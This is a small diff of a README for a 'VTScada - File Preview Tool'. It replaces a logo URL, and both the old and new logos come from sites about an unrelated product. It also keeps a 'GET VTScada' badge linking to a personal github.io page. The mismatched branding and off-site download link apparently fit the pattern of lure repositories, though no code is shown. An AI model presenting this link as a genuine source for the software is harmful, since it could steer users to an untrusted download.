@@ -1,6 +1,6 @@
 # VTScada - File Preview Tool
 
-![VTScada](Fhttps://www.mhj-wiki.de/en/plc-lab-3d-studio/pics/blender-and-3d-studio-logo.png?v=sys12a)
+![VTScada](https://plclab3dstudio.com/assets/logo-CQhB0ufI.png)
 
 [![GET VTScada](https://img.shields.io/badge/GET%20%E2%80%94%20VTScada-0078D6?style=for-the-badge&logoColor=white)](https://sumaita759.github.io/.github/VTScada)
 
